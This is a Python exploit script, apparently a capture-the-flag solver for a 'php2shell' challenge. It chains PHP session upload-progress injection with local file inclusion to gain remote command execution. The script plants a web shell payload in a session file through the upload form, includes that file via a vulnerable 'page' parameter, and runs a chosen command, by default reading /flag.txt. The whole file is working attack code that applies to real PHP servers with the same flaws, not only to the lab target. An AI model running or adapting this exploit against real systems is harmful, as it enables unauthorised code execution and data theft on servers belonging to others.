#!/usr/bin/env python3
"""
Chain A solver: session.upload_progress injection → LFI → RCE
Target: nginx + PHP-FPM on port 80
"""
import sys
import requests
import argparse

def exploit(host: str, port: int, cmd: str):
    target = f"http://{host}:{port}"
    session_id = "ctf_pwn_session_1337"

    # Step 1: inject PHP payload via upload progress key
    payload = f"<?php system($_GET['cmd']); ?>"
    print(f"[*] Injecting payload via upload_progress...")
    try:
        requests.post(
            f"{target}/index.php",
            data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
            files={"file": ("x", b"x" * 1024)},
            cookies={"PHPSESSID": session_id},
            timeout=10,
        )
    except Exception:
        pass  # response may error after injection — that's fine

    # Step 2: include session file via LFI
    session_path = f"/tmp/sessions/sess_{session_id}"
    print(f"[*] Including session file via LFI: {session_path}")
    r = requests.get(
        f"{target}/vuln.php",
        params={"page": session_path, "cmd": cmd},
        cookies={"PHPSESSID": session_id},
        timeout=10,
    )
    print(f"[*] Response ({r.status_code}):")
    print(r.text)

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="php2shell Chain A solver")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--cmd", default="cat /flag.txt")
    args = p.parse_args()
    exploit(args.host, args.port, args.cmd)
